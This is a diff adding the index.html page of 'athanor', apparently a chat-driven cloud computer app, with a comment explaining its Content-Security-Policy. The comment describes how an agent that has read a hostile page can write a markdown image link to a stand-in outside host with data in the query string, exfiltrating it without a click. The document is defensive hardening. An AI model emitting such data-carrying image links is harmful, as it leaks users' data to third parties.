@@ -1,0 +1,52 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <!--
+      The third and last enforcement of the rule in src/resource-policy.ts, and the only one that
+      survives the markdown pipeline being replaced: the browser refuses the request itself.
+
+      A message athanor writes is agent-authored text, and an agent that has just read a hostile
+      page writes what it read. `![](https://elsewhere.example/p.png?d=…)` is then a fetch with no
+      click and no approval — the address is the payload. `img-src` and `media-src` close that, and
+      `base-uri 'none'` stops a `<base>` from turning every relative address in the app into a
+      remote one. `connect-src` is deliberately absent: the workspace runner's stream and terminal
+      are legitimately on another origin, and a directive that breaks them would be removed rather
+      than fixed. This is the same policy the desktop shell has always enforced
+      (apps/desktop/src-tauri/tauri.conf.json); only the browser was open.
+    -->
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="img-src 'self' data: blob:; media-src 'self' data: blob:; font-src 'self' data:; object-src 'none'; base-uri 'none'"
+    />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, viewport-fit=cover, interactive-widget=resizes-content"
+    />
+    <meta name="theme-color" content="#0c0d0e" />
+    <meta name="color-scheme" content="dark" />
+    <meta
+      name="description"
+      content="A private, open-source cloud computer operated through an AI-first chat."
+    />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="athanor" />
+    <meta property="og:description" content="Your cloud computer, through chat." />
+    <meta property="og:image" content="/og-athanor.png" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:image:alt" content="athanor chat with contextual cloud workspace tools." />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="athanor" />
+    <meta name="twitter:description" content="Your cloud computer, through chat." />
+    <meta name="twitter:image" content="/og-athanor.png" />
+    <link rel="manifest" href="/manifest.webmanifest" />
+    <link rel="icon" href="/brand/athanor-icon-192.png" type="image/png" />
+    <link rel="apple-touch-icon" href="/brand/athanor-apple-touch.png" />
+    <title>athanor</title>
+  </head>
+  <body>
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+  </body>
+</html>
